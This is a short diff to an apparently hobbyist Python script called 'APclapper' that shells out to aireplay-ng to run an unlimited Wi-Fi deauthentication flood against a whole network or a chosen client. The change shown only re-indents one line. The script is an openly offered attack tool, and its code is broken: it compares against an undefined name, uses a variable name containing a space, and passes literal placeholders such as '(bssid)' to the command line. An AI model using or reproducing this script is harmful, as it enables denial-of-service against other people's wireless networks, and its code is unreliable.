@@ -16,7 +16,7 @@ aireplay = input("do you want to clap the entire network or just a client? Netwo
 if aireplay == Network:
   os.system("aireplay-ng -0 0 -a (bssid) wlan0mon")
 else:
-aireplay client = input("enter the client you wanna CLAP:")
+ aireplay client = input("enter the client you wanna CLAP:")
   os.system("aireplay-ng -0 0 -a (bssid) -c (aireplay client) wlan0mon")
 
 print ("The APclapper...")
